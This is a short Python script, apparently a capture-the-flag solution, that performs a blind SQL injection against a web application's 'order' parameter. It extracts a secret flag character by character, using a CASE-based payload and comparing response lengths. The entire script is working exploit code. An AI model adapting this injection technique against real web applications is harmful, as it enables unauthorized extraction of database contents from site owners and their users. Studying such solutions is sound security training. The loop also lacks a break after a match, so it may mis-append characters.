import requests

alphabet = '0123456789abcdef{}'
url = 'http://screenctf.com:20093'

curr = 'FLOG{'
i = 6

done = False
while not done:

    found = False

    for char in alphabet:
        print("Trying {}".format(curr + char))
        r = requests.post(url, data={
            'search': '',
            'order': f"name LIMIT (CASE (SELECT hex(substr(flag,{i},1)) FROM flag limit 1 offset 0) WHEN hex('{char}') THEN  1 ELSE 2 END)"
        })
        # print(r.headers['Content-length'])

        if int(r.headers['Content-length']) < 3646:
            found = True
            curr += char
            i += 1
            print("[+] Found {}".format(curr))

    if not found:
        break
